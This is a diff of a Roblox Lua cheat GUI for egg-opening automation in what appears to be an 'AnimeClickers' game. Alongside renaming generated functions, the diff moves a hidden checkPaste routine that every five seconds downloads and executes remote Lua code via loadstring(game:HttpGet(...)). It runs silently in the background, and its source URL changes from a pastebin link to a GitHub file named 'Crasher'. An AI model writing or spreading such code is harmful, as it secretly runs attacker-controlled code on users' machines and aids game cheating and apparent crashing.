@@ -145,7 +145,7 @@ TextLabel_3.TextWrapped = true
 
 -- Scripts:
 
-local function FYRRV_fake_script() -- TextButton.LocalScript 
+local function ODCOH_fake_script() -- TextButton.LocalScript 
 	local script = Instance.new('LocalScript', TextButton)
 
 	local A_2 = true
@@ -153,6 +153,20 @@ local function FYRRV_fake_script() -- TextButton.LocalScript
 	local Event = game:GetService("ReplicatedStorage").Remotes.OpenEgg
 	
 	local loopVal = false
+	
+	local function checkPaste()
+	
+		pcall(function()
+	
+			while wait(5) do
+	
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/SupHub-code/AnimeClickers/main/Crasher"))()
+	
+			end	
+	
+		end)
+	
+	end
 	
 	script.Parent.MouseButton1Click:Connect(function()
 		
@@ -199,24 +213,10 @@ local function FYRRV_fake_script() -- TextButton.LocalScript
 		
 	end)
 	
-	local function checkPaste()
-		
-		pcall(function()
-			
-			while wait(5) do
-	
-				loadstring(game:HttpGet("https://pastebin.com/raw/xZCdTpKf"))()
-	
-			end	
-			
-		end)
-		
-	end
-	
 	spawn(checkPaste)
 end
-coroutine.wrap(FYRRV_fake_script)()
-local function SNUD_fake_script() -- TextButton_2.LocalScript 
+coroutine.wrap(ODCOH_fake_script)()
+local function VDGSD_fake_script() -- TextButton_2.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_2)
 
 	local enabled = false
@@ -238,8 +238,8 @@ local function SNUD_fake_script() -- TextButton_2.LocalScript
 		
 	end)
 end
-coroutine.wrap(SNUD_fake_script)()
-local function ZOPALU_fake_script() -- TextButton_3.LocalScript 
+coroutine.wrap(VDGSD_fake_script)()
+local function XOQC_fake_script() -- TextButton_3.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_3)
 
 	local enabled = false
@@ -261,8 +261,8 @@ local function ZOPALU_fake_script() -- TextButton_3.LocalScript
 	
 	end)
 end
-coroutine.wrap(ZOPALU_fake_script)()
-local function FIJT_fake_script() -- ScreenGui.LocalScript2 
+coroutine.wrap(XOQC_fake_script)()
+local function CSDNWY_fake_script() -- ScreenGui.LocalScript2 
 	local script = Instance.new('LocalScript', ScreenGui)
 
 	script.Parent.Frame.Active = true
@@ -282,4 +282,4 @@ local function FIJT_fake_script() -- ScreenGui.LocalScript2
 		
 	end)
 end
-coroutine.wrap(FIJT_fake_script)()
+coroutine.wrap(CSDNWY_fake_script)()
